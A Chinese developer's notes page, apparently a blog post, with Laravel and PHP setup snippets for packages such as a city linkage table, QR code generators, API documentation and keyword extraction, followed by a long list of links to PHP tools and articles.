<h3 id="中国城市关联"><a href="#中国城市关联" class="headerlink" title="中国城市关联"></a>中国城市关联</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">$ composer <span class="built_in">require</span> eachdemo/city-linkage:dev-master</span><br><span class="line"># 发布资源文件</span><br><span class="line">$ php artisan vendor:publish --provider=<span class="string">"Eachdemo\CityLinkage\CityServiceProvider"</span></span><br><span class="line"># 生成数据库 表</span><br><span class="line">$ php artisan migrate</span><br><span class="line">Schema::create(<span class="string">'city_linkage'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">Blueprint $table</span>) </span>&#123;</span><br><span class="line">            $table-&gt;increments(<span class="string">'id'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'name'</span>);</span><br><span class="line">            $table-&gt;smallInteger(<span class="string">'parent_id'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'pinyin'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'initial'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'initials'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'suffix'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'code'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'order'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"># 填充表数据</span><br><span class="line">$ php artisan db:seed --<span class="class"><span class="keyword">class</span></span>=CitySeeder</span><br><span class="line">In Container.php line <span class="number">752</span>:</span><br><span class="line"></span><br><span class="line">  Class CitySeeder does not exist</span><br><span class="line">$ composer dump-autoload</span><br><span class="line">Generating optimized autoload files</span><br><span class="line">&gt; Illuminate\Foundation\ComposerScripts::postAutoloadDump</span><br><span class="line">&gt; @php artisan package:discover</span><br><span class="line">Discovered Package: appstract/laravel-opcache</span><br><span class="line">Discovered Package: appstract/lush-http</span><br><span class="line">Discovered Package: barryvdh/laravel-dompdf</span><br><span class="line">Discovered Package: barryvdh/laravel-snappy</span><br><span class="line">Discovered Package: chumper/zipper</span><br><span class="line">Discovered Package: darkaonline/l5-swagger</span><br><span class="line">Discovered Package: eachdemo/city-linkage</span><br><span class="line">Discovered Package: encore/laravel-admin</span><br><span class="line">Discovered Package: fideloper/proxy</span><br><span class="line">Discovered Package: ibrand/laravel-database-logger</span><br><span class="line">Discovered Package: ibrand/laravel-miniprogram-poster</span><br><span class="line">Discovered Package: intervention/image</span><br><span class="line">Discovered Package: jellybool/flysystem-upyun</span><br><span class="line">Discovered Package: laravel/passport</span><br><span class="line">Discovered Package: laravel/socialite</span><br><span class="line">Discovered Package: laravel/tinker</span><br><span class="line">Discovered Package: maatwebsite/excel</span><br><span class="line">Discovered Package: mews/captcha</span><br><span class="line">Discovered Package: nesbot/carbon</span><br><span class="line">Discovered Package: niklasravnsborg/laravel-pdf</span><br><span class="line">Discovered Package: socialiteproviders/manager</span><br><span class="line">Discovered Package: tumobi/qqmap-region</span><br><span class="line">Discovered Package: tymon/jwt-auth</span><br><span class="line">Discovered Package: vetor/laravel-collect</span><br><span class="line">Discovered Package: wenslim/editormd</span><br><span class="line">Discovered Package: zgldh/qiniu-laravel-storage</span><br><span class="line">Package manifest generated successfully.</span><br><span class="line">php artisan db:seed --<span class="class"><span class="keyword">class</span></span>=CitySeeder 失败时可以执行先 composer dump-autoload 再执行 php artisan db:seed --<span class="class"><span class="keyword">class</span></span>=CitySeeder 填充</span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">use Illuminate\Http\Request;</span><br><span class="line">use Eachdemo\CityLinkage\CityLinkage;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;	</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	$city = CityLinkage::getData();   		# 获取所有省份城市</span><br><span class="line">    	$city = CityLinkage::getData(1); 		# 获取北京市下所有区（北京id为1）</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> endroid/qr-code</span><br><span class="line"><span class="comment">//composer require simplesoftwareio/simple-qrcode</span></span><br><span class="line"></span><br><span class="line">use Endroid\QrCode\QrCode;</span><br><span class="line"></span><br><span class="line">$qrCode = <span class="keyword">new</span> QrCode(<span class="string">'Life is too short to be generating QR codes'</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: '</span>.$qrCode-&gt;getContentType());</span><br><span class="line">echo $qrCode-&gt;writeString();</span><br><span class="line">composer <span class="built_in">require</span> khanamiryan/qrcode-detector-decoder</span><br><span class="line">use Zxing\QrReader;</span><br><span class="line"></span><br><span class="line">$qrcode = <span class="keyword">new</span> QrReader(<span class="string">'path/to_image'</span>);</span><br><span class="line">$text = $qrcode-&gt;text(); <span class="comment">//return decoded text from QR Code</span></span><br></pre></td></tr></table></figure>
<h3 id="生成-API-文档"><a href="#生成-API-文档" class="headerlink" title="生成 API 文档"></a>生成 API 文档</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> wxm/ddoc --dev</span><br><span class="line">php artisan vendor:publish --provider=<span class="string">"Wxm\DDoc\DDocServiceProvider"</span> --force</span><br><span class="line">php artisan serve</span><br><span class="line">http:<span class="comment">//localhost:8000/ddoc</span></span><br><span class="line"></span><br><span class="line">vi routes/web.php</span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @Resource("登录令牌", uri="/token")</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取令牌</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &gt; 通过手机号和密码获取会话`token`即登录凭证.</span></span><br><span class="line"><span class="comment">     * &gt; 需要认证的请求请携带此 Authorization 头</span></span><br><span class="line"><span class="comment">     * &gt;</span></span><br><span class="line"><span class="comment">     * &gt; Authorization：Bearer &#123;token&#125;</span></span><br><span class="line"><span class="comment">     * &gt; </span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @Post("/")</span></span><br><span class="line"><span class="comment">     * @Versions(&#123;"v1"&#125;)</span></span><br><span class="line"><span class="comment">     * @Response(200, body=&#123;"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9hcGkueHkudGVzdFwvc2Vzc2lvbiIsImlhdCI6MTU0NTIxNjM5OSwiZXhwIjoxNTQ1MjE5OTk5LCJuYmYiOjE1NDUyMTYzOTksImp0aSI6Im9pZjV4WTNqS2JkbEhzVmQiLCJzdWIiOjEsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEifQ.p3oAVkAxSCxTug5s6168N-ccfuCCywGDFiJ0b9zCXq8","token_type":"bearer","expires_in":3600&#125;)</span></span><br><span class="line"><span class="comment">     * @Parameters(&#123;</span></span><br><span class="line"><span class="comment">     *      @Parameter("phone", type="integer", required=true, description="手机号."),</span></span><br><span class="line"><span class="comment">     *      @Parameter("password", type="string", required=true, description="密码."),</span></span><br><span class="line"><span class="comment">     * &#125;)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="生成identicon头像"><a href="#生成identicon头像" class="headerlink" title="生成identicon头像"></a>生成identicon头像</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> valiner/identicon-avatar</span><br><span class="line"><span class="built_in">require</span> __DIR__.<span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">use Valiner\IdenticonAvatar\Identicon;</span><br><span class="line"></span><br><span class="line">$identicon = <span class="keyword">new</span> Identicon();</span><br><span class="line"><span class="comment">//浏览器输出'sdp'的125px的图像https://github.com/valiner/identicon-avatar</span></span><br><span class="line">$identicon-&gt;getAvatar(<span class="string">'sdp'</span>,<span class="number">125</span>);</span><br></pre></td></tr></table></figure>
<h3 id="像-cms-一样安装-Laravel-项目"><a href="#像-cms-一样安装-Laravel-项目" class="headerlink" title="像 cms 一样安装 Laravel 项目"></a>像 cms 一样安装 Laravel 项目</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> rachidlaasri/laravel-installer</span><br><span class="line">php artisan vendor:publish --tag=laravelinstaller</span><br><span class="line">php artisan serve</span><br><span class="line">localhost:<span class="number">8000</span>/install  update</span><br></pre></td></tr></table></figure>
<h3 id="全新-PHP-运行时环境"><a href="#全新-PHP-运行时环境" class="headerlink" title="全新 PHP 运行时环境"></a>全新 PHP 运行时环境</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/polarphp/polarphp.git</span></span><br><span class="line">cd polarphp</span><br><span class="line">git submodule init</span><br><span class="line">git submodule update</span><br><span class="line">git checkout v0<span class="number">.0</span><span class="number">.1</span>-alpha</span><br><span class="line">./devtools/scripts/build_polarphp.sh</span><br><span class="line"></span><br><span class="line">docker run --rm -it polarphp_debug</span><br><span class="line">polar --version</span><br></pre></td></tr></table></figure>
<h3 id="url-生成二维码"><a href="#url-生成二维码" class="headerlink" title="url 生成二维码"></a>url 生成二维码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> <span class="string">"simplesoftwareio/simple-qrcode: ~2"</span></span><br><span class="line">QrCode::generate(<span class="string">'Make me into a QrCode!'</span>);</span><br><span class="line">QrCode::generate(<span class="string">'Make me into a QrCode!'</span>, <span class="string">'../public/qrcodes/qrcode.svg'</span>);</span><br><span class="line">QrCode::encoding(<span class="string">'UTF-8'</span>)-&gt;generate(<span class="string">'Make me a QrCode with special symbols ♠♥!!'</span>);</span><br><span class="line">QrCode::merge($filename, $percentage, $absolute);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Generates a QrCode with an image centered in the middle.</span></span><br><span class="line">QrCode::format(<span class="string">'png'</span>)-&gt;merge(<span class="string">'path-to-image.png'</span>)-&gt;generate();</span><br><span class="line">QrCode::BTC($address, $amount);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Sends a 0.334BTC payment to the address</span></span><br><span class="line">QrCode::BTC(<span class="string">'bitcoin address'</span>, <span class="number">0.334</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Sends a 0.334BTC payment to the address with some optional arguments</span></span><br><span class="line">QrCode::size(<span class="number">500</span>)-&gt;BTC(<span class="string">'address'</span>, <span class="number">0.0034</span>, [</span><br><span class="line">    <span class="string">'label'</span> =&gt; <span class="string">'my label'</span>,</span><br><span class="line">    <span class="string">'message'</span> =&gt; <span class="string">'my message'</span>,</span><br><span class="line">    <span class="string">'returnAddress'</span> =&gt; <span class="string">'https://www.returnaddress.com'</span></span><br><span class="line">]);</span><br><span class="line">QrCode::email(<span class="string">'foo@bar.com'</span>);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/19436#topnav</span></span><br></pre></td></tr></table></figure>
<h3 id="gif图片转字符"><a href="#gif图片转字符" class="headerlink" title="gif图片转字符"></a>gif图片转字符</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/hit9/gif2txt</span></span><br><span class="line">python gif2txt.py test.gif -m <span class="number">80</span> -o examples/out.html</span><br><span class="line">python gif2txt.py test.gif -m <span class="number">80</span> -o examples/withcolor.html -c</span><br><span class="line">python gif2txt.py pacman.gif -o examples/pacman.html -c --green-screen-sensibility <span class="number">128</span></span><br><span class="line">python gif2txt.py test.gif -r -o examples/reversegreenscreen.html</span><br><span class="line"></span><br><span class="line">在线浏览动图https:<span class="comment">//hit9.github.io/gif2txt/examples/out.html</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-提取文章关键词"><a href="#PHP-提取文章关键词" class="headerlink" title="PHP 提取文章关键词"></a>PHP 提取文章关键词</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> fukuball/jieba-php:dev-master</span><br><span class="line">&lt;?php <span class="comment">// index.php</span></span><br><span class="line">include_once <span class="string">'./vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'memory_limit'</span>, <span class="string">'600M'</span>);</span><br><span class="line"></span><br><span class="line">use Fukuball\Jieba\Jieba;</span><br><span class="line">use Fukuball\Jieba\Finalseg;</span><br><span class="line">use Fukuball\Jieba\JiebaAnalyse;</span><br><span class="line"></span><br><span class="line">Jieba::init(array(<span class="string">'mode'</span> =&gt; <span class="string">'test'</span>, <span class="string">'dict'</span> =&gt; <span class="string">'small'</span>));</span><br><span class="line">Finalseg::init();</span><br><span class="line">JiebaAnalyse::init();</span><br><span class="line"></span><br><span class="line">$top_k = <span class="number">10</span>; <span class="comment">// 获取前10个关键词</span></span><br><span class="line">$content = file_get_contents(<span class="string">'./test.txt'</span>);</span><br><span class="line"></span><br><span class="line">$tags = JiebaAnalyse::extractTags($content, $top_k);</span><br><span class="line"></span><br><span class="line">var_dump($tags);</span><br><span class="line">https:<span class="comment">//blog.foof.dev/posts/php-0</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/jc91715/oc-plugin-music plugins/jc91715/music" target="_blank" rel="noopener">音乐聚合搜索</a></p>
<p><a href="https://github.com/alhimik1986/php-excel-templator" target="_blank" rel="noopener">php excel样式</a></p>
<p><a href="https://github.com/rap2hpoutre/fast-excel" target="_blank" rel="noopener">快速Excel</a></p>
<p><a href="https://github.com/crazyhl/php_jump_auto" target="_blank" rel="noopener">微信跳一跳的 php 版本https://www.h57.pw/2018/01/05/use-php-to-achieve-wechat-jump-for-android-phones/</a></p>
<p><a href="https://learnku.com/articles/28049" target="_blank" rel="noopener">PHP 高效的开发量化数字货币交易程序 github.com/zhouaini528/exchanges-php</a></p>
<p><a href="https://learnku.com/articles/24941" target="_blank" rel="noopener">PHP实现PCM格式音波文件转WAV格式音频文件</a></p>
<p><a href="https://www.fanhaobai.com/2017/05/composer.html" target="_blank" rel="noopener">搭建私有仓库</a></p>
<p><a href="https://github.com/zorlan/skycaiji" target="_blank" rel="noopener">PHP 爬虫系统 </a></p>
<p><a href="https://github.com/shockerli/php-awesome" target="_blank" rel="noopener">PHP 最优秀资源的整理汇集 </a></p>
<p><a href="https://github.com/adsr/phpspy" target="_blank" rel="noopener">PHP火焰图工具，支持php7</a></p>
<p><a href="https://www.oschina.net/news/103996/introduce-polarphp?from=groupmessage" target="_blank" rel="noopener">将PHP语言打造成为一门真正的通用性脚本语言</a></p>
<p><a href="https://github.com/mishe/blog/issues/129" target="_blank" rel="noopener">API 接口设计规范</a></p>
<p><a href="https://github.com/jianyan74/php-excel" target="_blank" rel="noopener">PhpSpreadsheet 简单 Excel 导入导出</a></p>
<p><a href="https://learnku.com/laravel/t/17232" target="_blank" rel="noopener">阅读过的干货文章</a></p>
<p><a href="https://github.com/FriendsOfPHP/Sami" target="_blank" rel="noopener">生成 API https://laravel.com/api/5.7/index.html</a></p>
<p><a href="http://phpbench.com/" target="_blank" rel="noopener">有 if 一定要有 else</a></p>
<p><a href="http://www.syyong.com/other/Dokuwiki-Secondary-Development-Record.html" target="_blank" rel="noopener">Dokuwiki 二次开发记录</a></p>
<p><a href="https://learnku.com/articles/19427" target="_blank" rel="noopener">Laravel5.5 支付宝支付</a></p>
<p><a href="https://laravel-china.org/articles/22338#478a16" target="_blank" rel="noopener">php函数</a></p>
<p><a href="https://laravel-china.org/articles/22323?#reply78161" target="_blank" rel="noopener">Windows 下最详细的源码编译 PHP 以及 PHP 扩展</a></p>
<p><a href="http://querylist.cc/querylist-test/" target="_blank" rel="noopener">在线采集数据</a></p>
<p><a href="https://github.com/uuk020/logistics?utm_source=gold_browser_extension" target="_blank" rel="noopener">PHP 多接口获取快递物流信息包</a></p>
<p><a href="https://github.com/nextcloud/server?utm_source=gold_browser_extension" target="_blank" rel="noopener">私有云服务器</a></p>
<p><a href="https://github.com/chenlinzhong/php-delayqueue" target="_blank" rel="noopener">基于redis实现高可用，易拓展，接入方便，生产环境稳定运行的延迟队列</a></p>
<p><a href="https://laravel-china.org/articles/17883" target="_blank" rel="noopener">JWT 超详细分析</a></p>
<p><a href="https://laravelacademy.org/post/3640.html" target="_blank" rel="noopener">Laravel 5 中使用 JWT</a></p>
<p><a href="https://segmentfault.com/p/1210000011003394/read#top" target="_blank" rel="noopener">别再这样使用JWT了！</a></p>
<p><a href="http://www.beanbun.org/#/?id=%E5%AE%89%E8%A3%85" target="_blank" rel="noopener"> PHP 编写的多进程网络爬虫框架</a></p>
<p><a href="https://segmentfault.com/a/1190000014782815" target="_blank" rel="noopener">laravel扩展包——laravel-dompdf和laravel-snappy</a></p>
<p><a href="https://blog.cooooler.com/2018/08/29/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8Blaravel%E4%B8%AD%E8%BF%9B%E8%A1%8CPDF%E5%AF%BC%E5%87%BA%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">laravel中进行PDF导出遇到的问题</a></p>
<p><a href="http://www.cnblogs.com/xxoome/p/6083542.html" target="_blank" rel="noopener">解决larave-dompdf中文字体显示问题</a></p>
<p><a href="https://laravel-china.org/topics/2477/dompdf-on-the-export-of-chinese-garbled-question/" target="_blank" rel="noopener">关于 DomPDF 导出中文乱码问题</a></p>
<p><a href="https://laravel-china.org/articles/20815" target="_blank" rel="noopener">Web 安全之 XSS Platform 搭建及使用实践</a></p>
<p><a href="https://segmentfault.com/a/1190000018471055" target="_blank" rel="noopener">PHP比特币开发系列教程汇总</a></p>
<p><a href="https://github.com/alicfeng/IdentityCard" target="_blank" rel="noopener">中国（大陆）公民身份证类</a></p>
<p><a href="https://github.com/Gopusher/gateway" target="_blank" rel="noopener">消息推送系统</a></p>
<p><a href="https://github.com/xiaohuilam/laravel/wiki" target="_blank" rel="noopener">Laravel 深入浅出指南 </a></p>
<p><a href="https://laravel-china.org/articles/17553" target="_blank" rel="noopener"> implode.io 记录分享你的代码片段</a></p>
<p><a href="https://github.com/overtrue/yike.io" target="_blank" rel="noopener">小程序社区</a></p>
<p><a href="https://laravel-china.org/articles/22028" target="_blank" rel="noopener">php以太坊</a></p>
<p><a href="https://github.com/Gopusher/laravel-chat" target="_blank" rel="noopener">聊天应用</a></p>
<p><a href="https://github.com/jormin/laravel-ddoc" target="_blank" rel="noopener">数据字典自动生成文档</a></p>
<p><a href="https://coffeephp.com/articles/4#20%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">PHPer的面试总结</a></p>
<p><a href="https://implode.io/" target="_blank" rel="noopener">方便 PHPer，Laraveler 测试代码的有用工具</a></p>
<p><a href="https://github.com/appzcoder/30-seconds-of-php-code" target="_blank" rel="noopener">30s php</a></p>
<p><a href="https://juejin.im/post/5b67b50a6fb9a04fda4e3902" target="_blank" rel="noopener">巧用 PHP 数组函数</a></p>
<p><a href="https://laravel-china.org/articles/20277" target="_blank" rel="noopener"> Snowflake 生成分布式唯一 ID</a></p>
<p><a href="https://laravel-china.org/topics/21368" target="_blank" rel="noopener">ZipArchive 解压中文文件乱码</a></p>
<p><a href="https://laravel-china.org/articles/17867?#reply76200" target="_blank" rel="noopener">简聊 Session 与 Token 身份验证</a></p>
<p><a href="https://github.com/xkeyi/aliyun-sms" target="_blank" rel="noopener">基于阿里云短信服务的 PHP 扩展包</a></p>
<p><a href="https://laravel-china.org/topics/19786" target="_blank" rel="noopener">中国标准行政区划数据</a></p>
<p><a href="https://laravel-china.org/articles/19867?#reply76298" target="_blank" rel="noopener">实用 Markdown 编辑器</a></p>
<p><a href="https://laravel-china.org/articles/20247" target="_blank" rel="noopener">你可能不太需要 Laravel-Excel</a></p>
<p><a href="https://laravel-china.org/articles/20450" target="_blank" rel="noopener">Laravel HTML 导出 PDF 方案 —– wkhtmltopdf Laravel-snappy</a></p>
<p><a href="https://github.com/arnaud-lb/php-rdkafka" target="_blank" rel="noopener">php-rdkafka</a></p>
<p><a href="https://github.com/DarkaOnLine/L5-Swagger" target="_blank" rel="noopener">laravel Swagger</a></p>
<p><a href="https://github.com/PrintNow/php-sorry-gif" target="_blank" rel="noopener">在线制作 sorry 为所欲为</a></p>
<p><a href="https://laravel-china.org/articles/21870?#reply77085" target="_blank" rel="noopener">nginx 实现动态生成缩略图</a></p>
<p><a href="http://www.dahouduan.com/2017/09/18/php-consume-kafka/" target="_blank" rel="noopener">PHP 处理kafka消息实例</a></p>
<p><a href="https://github.com/dedemao/alipay" target="_blank" rel="noopener">一个PHP文件搞定支付宝支付系列</a></p>
<p><a href="https://segmentfault.com/a/1190000015765348#articleHeader0" target="_blank" rel="noopener">PHP下kafka的实践</a></p>
<p><a href="https://aiddroid.com/kafka-introduction-and-php-kafka-usage/" target="_blank" rel="noopener">使用PHP处理Kafka消息</a></p>
<p><a href="https://github.com/weiboad/kafka-php/blob/master/README_CH.md" target="_blank" rel="noopener">Kafka-php</a></p>
<p><a href="https://github.com/KEN-studio/laravel-wechat-robot-personal" target="_blank" rel="noopener">基于 Laravel 可灵活自定义的的私人微信机器人</a></p>
<p><a href="https://laravel-china.org/articles/4389/simple-and-easy-to-deploy-your-project-deployer" target="_blank" rel="noopener">简单轻松部署你的项目 - Deployer</a></p>
<p><a href="https://laravel-china.org/articles/22410" target="_blank" rel="noopener">PHP 资源列表大全</a></p>
<p><a href="https://www.kancloud.cn/webxyl/php_oop/68885" target="_blank" rel="noopener">php面向对象</a></p>
<p><a href="https://github.com/qbhy/baidu-aip-sdk" target="_blank" rel="noopener">百度AI开放平台 PHP SDK</a></p>
<p><a href="https://github.com/xkeyi/aliyun-sms" target="_blank" rel="noopener">阿里云短信服务的 PHP 扩展包</a></p>
<p><a href="https://segmentfault.com/a/1190000014239648" target="_blank" rel="noopener">PHP使用QueryList采集微信文章页</a></p>
<p><a href="https://doc.phpopencv.org/" target="_blank" rel="noopener">PHP人工智能</a></p>
<p><a href="https://github.com/duckchat/gaga" target="_blank" rel="noopener">PHP 编写的聊天软件</a></p>
<p><a href="https://github.com/yan68/xcrawler" target="_blank" rel="noopener">PHP爬虫框架</a></p>
<p><a href="https://mp.weixin.qq.com/s/39qWjkTwy_A2vd7ZY8gRTQ" target="_blank" rel="noopener">支付系统</a></p>
<p><a href="https://github.com/iymiym/leetcode" target="_blank" rel="noopener">php leetcode </a></p>
<p><a href="http://phpfiddle.org/#" target="_blank" rel="noopener">在线测试PHP</a></p>
<p><a href="https://learnku.com/articles/17883" target="_blank" rel="noopener">JWT 超详细分析</a></p>
<p><a href="https://learnku.com/articles/24172" target="_blank" rel="noopener">PHP 面试常考内容之面向对象</a></p>
<p><a href="http://blog.text.wiki/2016/06/15/problem-tips.html" target="_blank" rel="noopener">PHP性能监控问题记录之一－安装配置php-apm</a></p>
<p><a href="http://www.54php.cn/default/223.html" target="_blank" rel="noopener">PHP实现 手机号码归属地查询</a></p>
<p><a href="https://kuricat.com/articles/nginx-to-php-fpm-fcfvq" target="_blank" rel="noopener">Nginx to PHP-FPM</a></p>
<p><a href="https://github.com/apanly/open_kf_v1" target="_blank" rel="noopener">编程浪子开源云客服</a></p>
<p><a href="https://github.com/metowolf/Meting" target="_blank" rel="noopener">音乐api</a></p>
<p><a href="https://www.paycats.cn/" target="_blank" rel="noopener">帮助个人开发者在线收款的接口服务</a></p>
<p><a href="https://github.com/hunzhiwange/queryphp" target="_blank" rel="noopener">爬虫框架</a></p>
<p><a href="https://gitee.com/zeng2/musicPhp" target="_blank" rel="noopener">PHP下载音乐</a></p>
<p><a href="https://github.com/aiqq363927173/chat-im" target="_blank" rel="noopener">web即时聊天</a></p>
<p><a href="https://github.com/igbinary/igbinary" target="_blank" rel="noopener">替代serialize的扩展igbinary</a></p>
<p><a href="https://github.com/guanguans/dnmp-plus" target="_blank" rel="noopener">Docker+Nginx+MySQL+PHP (xhprof、tideways)+xhgui开发环境</a></p>
<p><a href="https://learnku.com/articles/29686" target="_blank" rel="noopener">PHP 并发场景</a></p>
<p><a href="https://github.com/maicong/music" target="_blank" rel="noopener">多站合一音乐搜索解决方案</a></p>
<p><a href="https://www.ctolib.com/categories/php-command-line.html" target="_blank" rel="noopener">构建命令行工具的库</a></p>
<p><a href="https://github.com/wizarot/redis-cli" target="_blank" rel="noopener">PHP版本的 Redis命令行客户端</a></p>
<p><a href="https://github.com/kaixin1995/InformationPush" target="_blank" rel="noopener">个人微信模板信息推送</a></p>
<p><a href="https://github.com/guyueyingmu/avbook" target="_blank" rel="noopener">av电影管理系统https://github.com/hldh214/gas</a></p>
